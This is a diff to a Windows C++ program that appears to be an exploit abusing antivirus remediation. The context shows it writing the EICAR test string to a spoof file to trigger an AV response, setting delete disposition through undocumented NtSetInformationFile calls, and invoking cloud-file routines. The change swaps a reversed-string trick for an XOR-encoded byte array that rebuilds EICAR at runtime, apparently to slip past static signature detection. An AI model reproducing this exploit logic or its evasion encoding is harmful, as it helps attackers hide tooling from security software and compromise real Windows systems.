@@ -4,6 +4,7 @@
 
 #define _CRT_SECURE_NO_WARNINGS
 #include <iostream>
+#include <string>
 #include <Windows.h>
 #include <conio.h>
 #include <winternl.h>
@@ -424,25 +425,22 @@ retry:
 }
 
 
-void rev(char* s) {
-
-    // Initialize l and r pointers
-    int l = 0;
-    int r = strlen(s) - 1;
-    char t;
-
-    // Swap characters till l and r meet
-    while (l < r) {
-
-        // Swap characters
-        t = s[l];
-        s[l] = s[r];
-        s[r] = t;
-
-        // Move pointers towards each other
-        l++;
-        r--;
+std::string getEICAR() {
+    unsigned char encoded[] = {
+        0xF2, 0x9F, 0xE5, 0x8B, 0xFA, 0x8F, 0xEA, 0xEB, 0xFA, 0xF1,
+        0x9E, 0xF6, 0xFA, 0xF0, 0xF2, 0x9F, 0x9E, 0x82, 0xFA, 0xF4,
+        0x83, 0x9D, 0xE9, 0xE9, 0xCC, 0xCE, 0xD9, 0xCE, 0xD9, 0xCC,
+        0x83, 0x9D, 0xD7, 0x8E, 0xEF, 0xE3, 0xE9, 0xEB, 0xF8, 0x87,
+        0xF9, 0xFE, 0xEB, 0xE4, 0xEE, 0xEB, 0xF8, 0xEE, 0x87, 0xEB,
+        0xE4, 0xFE, 0xE3, 0xFC, 0xE3, 0xF8, 0xFF, 0xF9, 0x87, 0xFE,
+        0xEF, 0xF9, 0xFE, 0x87, 0xEC, 0xE3, 0xE6, 0xEF, 0x8B, 0x8E,
+        0xE2, 0x81, 0xE2, 0x80
+    };
+    std::string result;
+    for (size_t i = 0; i < sizeof(encoded); i++) {
+        result += (char)(encoded[i] ^ 0xAA);
     }
+    return result;
 }
 
 
@@ -618,10 +616,9 @@ int main()
         printf("Failed create spoof work file.\n");
         return 1;
     }
-    char eicar[] = "*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)fsdsdfCC7)^P(45XZP\\4[PA@%P!O5X";
-    rev(eicar);
+    std::string eicar = getEICAR();
     DWORD nwf = 0;
-    WriteFile(hfile, eicar, sizeof(eicar) - 1, &nwf, NULL);
+    WriteFile(hfile, eicar.c_str(), (DWORD)eicar.size(), &nwf, NULL);
     
     // trigger AV response
     CreateFile(foo, GENERIC_READ | FILE_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -635,7 +632,7 @@ int main()
     FILE_DISPOSITION_INFORMATION_EX fdiex = { 0x00000001 | 0x00000002 };
     _NtSetInformationFile(hfile, &iostat, &fdiex, sizeof(fdiex), (FILE_INFORMATION_CLASS)64);
     CloseHandle(hfile);
-    DoCloudStuff(workdir, filename, sizeof(eicar) - 1);
+    DoCloudStuff(workdir, filename, (DWORD)eicar.size());
     
     OVERLAPPED ovd = { 0 };
     ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
